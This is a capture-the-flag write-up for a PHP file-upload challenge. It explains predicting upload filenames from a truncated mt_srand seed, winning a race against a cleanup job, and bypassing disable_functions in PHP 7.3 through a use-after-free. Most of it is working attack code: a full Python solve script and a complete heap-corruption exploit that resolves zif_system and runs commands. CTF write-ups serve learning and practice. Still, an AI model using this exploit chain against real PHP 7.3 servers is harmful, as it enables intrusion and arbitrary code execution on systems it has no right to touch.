## WEIRD_FILE_UPLOAD  

<img src="images/chall.png" width=600>

We are given a relatively small PHP server that allows us to upload and view files.  

When we supply a filename through the `?try=` parameter, the server runs an `include()` on it, which means we get arbitrary code execution if we can upload a PHP file.  

However, our filename is prepended with a random hash. `mt_srand()` is seeded with a secret `/seed.txt`, then a SHA256 hash is computed using the RNG value and our IP address.  

The backend enforces strict guards against path traversal, so we can't just simply overwrite `/seed.txt` to derive our uploaded filename.  

```php
$seedFile = "/seed.txt";
$uploadDir = "./uploads/";
$maxFileSize = 10000; 

$seed = file_get_contents($seedFile);
mt_srand($seed);
$randomValue = mt_rand();

function displayMessage($message) {
    echo "<div class='message success'>$message</div>";
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!empty($_FILES["file"]["name"]) && $_FILES["file"]["size"] <= $maxFileSize && strpos($_FILES["file"]["name"], "..") === false) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $hash = hash('sha256', $randomValue . $ip);
        $newFilename = $hash . "_" . basename($_FILES["file"]["name"]);
        $uploadFile = $uploadDir . $newFilename;

        if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadFile)) {
            displayMessage("Your cosmic anomaly has been absorbed into our bizarre dimension!");
        }
    }
} elseif (isset($_GET["try"])) {
    $path = "./uploads/" . $_GET["try"];
    if (strpos($path, "..") === false) {
        include $path;
    }
}
```

Looking at the Dockerfile, we will notice that a background script is being run that clears the `./uploads` directory every 10 seconds, which means we need to be able to compute our filename quickly.  

Another important thing we will notice is that `/seed.txt` contains a random hex value. This is huge, because `mt_srand()` expects an integer, but since the hex charset is `0-9a-f`, any letter will cause `mt_srand()` to terminate early and treat the leading digits as the seed.  

```dockerfile
FROM php:7.3-apache
ARG DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Seoul
RUN chmod -R 755 /etc/apache2 && \
    chown -R root:root /var/www && \
    chmod -R 755 /var/www
RUN apt-get update && apt-get install -y gcc
RUN rm /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log
RUN openssl rand -hex 32 > /seed.txt && \
    chown root:root /seed.txt && \
    chmod 444 /seed.txt
COPY html /var/www/html
RUN chown -R root:root /var/www/html && \
    chmod -R 555 /var/www/html
RUN gcc -o /flag /var/www/html/flag.c && \
    chmod 111 /flag && \
    rm /var/www/html/flag.c
    
RUN mkdir -p /var/www/html/uploads && \
    chown -R www-data:www-data /var/www/html/uploads && \
    chmod -R 333 /var/www/html/uploads
COPY ./config/php.ini /usr/local/etc/php/php.ini

RUN chmod -R 555 /var/log/apache2 && \
    touch /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log && \
    chmod 644 /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log

EXPOSE 80
CMD while true; do find /var/www/html/uploads/ -mindepth 1 -delete; sleep 10s; done & \
    apache2-foreground
```

Taking this into account, we realise that the search space for `mt_srand()` reduces dramatically, as each hex character has a 6/16 chance of being a digit, which translates to a roughly 85% chance that the seed is somewhere between `0-999`.  

To keep under the 10 second time limit from earlier, we can precompute and bruteforce a list of hashes using seeds `0-999`. We can leave an `echo` statement in our webshell to act as a marker, so that we can discern if we hit the correct filename and the `include()` executed successfully.  

```python
import requests
import re
import hashlib
import subprocess
import time
import requests

url = 'http://host3.dreamhack.games:21395/'
s = requests.Session()

WEBSHELL_NAME = 'payload.php'
WEBSHELL_MARKER = "WEBSHELL_PWN_1337"

def gen_candidates(start, end):
    php_src = f"""
        for ($s = {start}; $s <= {end}; $s++) {{
            mt_srand($s);
            echo mt_rand() . "\\n";
        }}
    """
    out = subprocess.run(["php", "-r", php_src], capture_output=True, text=True, check=True)
    return [int(line) for line in out.stdout.splitlines() if line.strip()]

def build_hash_list(ip, start, end):
    values = gen_candidates(start, end)
    hashes = []
    for v in values:
        h = hashlib.sha256(f"{v}{ip}".encode()).hexdigest()
        hashes.append(h)
    return hashes

def upload(filename, contents):
    res = s.post(url, files={
        "file": (filename, contents, "application/x-php")
    })

    assert 'absorbed' in res.text
    print("> Uploaded", filename)

def race_window(hashes, deadline):
    for h in hashes:
        if time.time() > deadline:
            return None

        cand = f"{h}_{WEBSHELL_NAME}"
        res = s.get(url, params={"try": cand})

        if WEBSHELL_MARKER in res.text:
            return cand
        
    return None

def get_ip():
    data = subprocess.run(['curl', 'ifconfig.me'], capture_output=True)

    return data.stdout.decode()

ip = get_ip()
print("> IP:", ip)

payload = '''
<?php
    echo "%s";
''' % WEBSHELL_MARKER

seed = 0
while seed <= 999:
    print("> Precomputing seed hashes")
    hashes = build_hash_list(ip, seed, 999)

    upload(WEBSHELL_NAME, payload)

    path = race_window(hashes, time.time() + 9.0)

    assert path
    print("> Payload path:", path)

    break
```

Now that we have a way of accessing our payload file, we have one last obstacle to overcome.  

The server is run with a custom `php.ini` config file, which disables every single PHP builtin function that gives RCE.  
 
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,
    curl_exec,curl_multi_exec,parse_ini_file,show_source,
    pcntl_exec,eval,assert,create_function,mail,copy,
    putenv,preg_replace,imageftbbox,bindtextdomain,
    chmod,opendir,readdir,readlink,stream_socket_server,
    fsocket,chroot,chgrp,chown,proc_get_status,
    ini_alter,ini_restore,openlog,fread,fgets,file,
    readfile,fpassthru,fputs,set_time_limit,ini_set,
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,
    pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
    pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,
    pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,
    pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,
    pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,
    pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
    symlink,link,syslog,imap_open,ld,error_log,dl,imap_mail

allow_url_include = Off
allow_url_fopen = Off
session.upload_progress.enabled = Off
stream.wrapper.compress.zlib = Off
stream.wrapper.phar = Off
```

Thankfully, recalling that the Dockerfile installs PHP 7.3 in the container, we can do a bit of research and find that this version of PHP has a UAF bug that allows for bypassing `disable_functions()`.  

We can adapt from [this POC](https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php), which will finally give us full RCE.  

Below is my full solve script for this challenge.  

```python
import requests
import re
import hashlib
import subprocess
import time
import requests

url = 'http://host3.dreamhack.games:21395/'
s = requests.Session()

WEBSHELL_NAME = 'payload.php'
WEBSHELL_MARKER = "WEBSHELL_PWN_1337"

def gen_candidates(start, end):
    php_src = f"""
        for ($s = {start}; $s <= {end}; $s++) {{
            mt_srand($s);
            echo mt_rand() . "\\n";
        }}
    """
    out = subprocess.run(["php", "-r", php_src], capture_output=True, text=True, check=True)
    return [int(line) for line in out.stdout.splitlines() if line.strip()]

def build_hash_list(ip, start, end):
    values = gen_candidates(start, end)
    hashes = []
    for v in values:
        h = hashlib.sha256(f"{v}{ip}".encode()).hexdigest()
        hashes.append(h)
    return hashes

def upload(filename, contents):
    res = s.post(url, files={
        "file": (filename, contents, "application/x-php")
    })

    assert 'absorbed' in res.text
    print("> Uploaded", filename)

def race_window(hashes, deadline):
    for h in hashes:
        if time.time() > deadline:
            return None

        cand = f"{h}_{WEBSHELL_NAME}"
        res = s.get(url, params={"try": cand})

        if WEBSHELL_MARKER in res.text:
            return cand
        
    return None

def get_ip():
    data = subprocess.run(['curl', 'ifconfig.me'], capture_output=True)

    return data.stdout.decode()

ip = get_ip()
print("> IP:", ip)

cmd = '/flag'

payload = '''
<?php
    echo "%s";

new Pwn("%s");

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log("abc @ 0x%%x", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log("uaf failed");
            return;
        }

        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log("helper handlers @ 0x%%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log("real closure @ 0x%%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log("closure class_entry @ 0x%%x", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log("basic_functions @ 0x%%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log("zif_system @ 0x%%x", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log("fake closure @ 0x%%x", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }

    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log("standard module @ 0x%%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = "") {
        if(self::LOGGING) {
            printf("{$format}\\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}
''' % (WEBSHELL_MARKER, cmd)

seed = 0
while seed <= 999:
    print("> Precomputing seed hashes")
    hashes = build_hash_list(ip, seed, 999)

    upload(WEBSHELL_NAME, payload)

    path = race_window(hashes, time.time() + 9.0)

    assert path
    print("> Payload path:", path)

    break

res = s.get(f'{url}', params={
    'try': path
})

flag = re.findall(r'(YISF{.+?})', res.text)[0].strip()
print("> Flag:", flag)
```

Flag: `YISF{F11e_upl0Ader_1N_w0nderl4Nd}`